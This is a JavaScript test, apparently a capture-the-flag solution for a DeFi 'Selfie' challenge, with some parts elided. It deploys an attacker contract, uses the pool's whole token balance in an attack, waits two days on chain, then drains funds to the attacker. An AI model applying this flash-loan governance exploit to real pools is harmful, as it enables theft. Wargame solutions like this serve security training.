...
describe('[Challenge] Selfie', function () {
  ...
  it('Exploit', async function () {
    ...
    const AttackerSelfie = await ethers.getContractFactory(
      'AttackerSelfie',
      attacker,
    );
    this.attacker = await AttackerSelfie.deploy(
      this.governance.address,
      this.pool.address,
    );
    const TOKENS_IN_POOL = await this.token.balanceOf(this.pool.address);
    await this.attacker.attack(TOKENS_IN_POOL);
    await ethers.provider.send('evm_increaseTime', [2 * 24 * 60 * 60]); // 2 days
    this.attacker.drainToAttacker();
  });
